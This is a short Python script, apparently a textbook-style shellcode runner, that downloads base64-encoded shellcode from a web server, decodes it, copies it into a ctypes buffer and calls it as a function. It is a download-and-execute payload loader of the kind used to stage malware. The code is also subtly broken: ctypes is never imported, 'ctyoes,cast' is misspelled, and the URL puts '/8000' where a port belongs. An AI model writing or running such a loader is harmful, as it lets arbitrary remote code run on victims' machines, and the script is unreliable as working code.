import urllib.request
import urllib.error
import base64

#retrieve shellcode from the web server 
url = "http://localhost/8000/shellcode.bin"
response = urllib.request.urlopen(url)

#create shellcode from base64 
shellcode = base64.b64decode(response.read())

#create a buffer in memory 
shellcode_buffer = ctypes.create_string_buffer(shellcode, len(shellcode))

#create a function pointer to our shellcode 
shellcode_func = ctyoes,cast(shellcode_buffer, ctypes.CFUNCTYPE (ctypes.c_void_p))

#call shellcode 
shellcode_func()
